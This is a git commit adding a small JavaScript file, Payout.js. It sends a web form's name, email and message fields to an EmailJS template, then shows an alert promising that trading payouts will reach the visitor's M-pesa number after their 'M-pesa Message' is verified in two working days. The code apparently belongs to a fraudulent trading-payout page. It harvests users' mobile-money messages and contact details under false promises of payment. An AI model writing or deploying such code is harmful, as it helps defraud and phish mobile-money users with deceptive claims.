9cb4e6433d59a8cafe98eb0cef70a50a1e6748c4
alphafx0 <management1alphafx@gmail.com>
2024-05-03 09:24:11 +0300

    Add files via upload

---
+++ Payout.js
@@ -0,0 +1,21 @@
+function sendMail() {
+    var params = {
+      name: document.getElementById("name").value,
+      email: document.getElementById("email").value,
+      message: document.getElementById("message").value,
+    };
+     const serviceID = " service_gzcatwf ";
+    const templateID = "   template_0p4hanq ";
+  
+      emailjs.send(serviceID, templateID, params)
+      .then(res=>{
+          document.getElementById("name").value = "";
+          document.getElementById("email").value = "";
+          document.getElementById("message").value = "";
+          console.log(res);
+          alert(" Success; Your Trading have started , Your Payout will reflect in Your M-pesa Number  after a successfull Trade.  You will get paid to Your M-pesa Number  when your M-pesa Message Completes Verification ⚠      Verification takes 2 Working Days")
+  
+      })
+      .catch(err=>console.log(err));
+  
+  }
